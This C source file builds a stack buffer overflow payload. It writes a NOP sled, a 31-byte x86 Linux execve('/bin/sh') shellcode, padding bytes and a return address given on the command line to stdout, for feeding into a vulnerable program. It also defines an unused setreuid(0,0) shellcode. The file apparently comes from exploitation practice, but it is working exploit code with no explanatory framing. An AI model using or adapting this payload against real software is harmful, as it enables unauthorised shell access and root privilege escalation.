#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define NOP 0x90
#define WNOP 0x9066

#define STDOUT 1

char setreuide[]=
  "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80"; /* 10 */
char shell[]="\xeb\x10\x5b\x31\xc0\x88\x43\x07\x50\x53\x89\xe1\xb0\x0b\x31\xd2"
  "\xcd\x80\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23"; /* 31 */

int main(int argc, char* argv[]) 
{
  if (argc < 6) {
    printf("Not enough arguments\n");
    exit(1);
  }

  /* parameters:
      NOPs_before_shellcode
      NOPs_after_shellcode
      nr_bogus_bytes
      PTR_to_shellcode
      nr_bogus_bytes
  */
  int i;
  char c;

  c = NOP;
  /* nops before shellcode */
  for (i=0; i<atoi(argv[1]); ++i) {
    write(STDOUT, &c, 1);
  }

  // len of code is 31
  write(STDOUT, &shell, strlen(shell));
  
  /* nops after shellcode */
  for (i=0; i<atoi(argv[2]); ++i) {
    write(STDOUT, &c, 1);
  }

  c = 'A';
  /* bogus bytes */
  for (i=0; i<atoi(argv[3]); ++i) {
    write(STDOUT, &c, 1);
  }

  int ptr = strtol(argv[4], NULL, 16);
  //printf("READ: %x\n", ptr);
  
  write(STDOUT, &ptr, 4);
  
  /* bogus bytes */
  for (i=0; i<atoi(argv[5]); ++i) {
    write(STDOUT, &c, 1);
  }

  return 0;
}
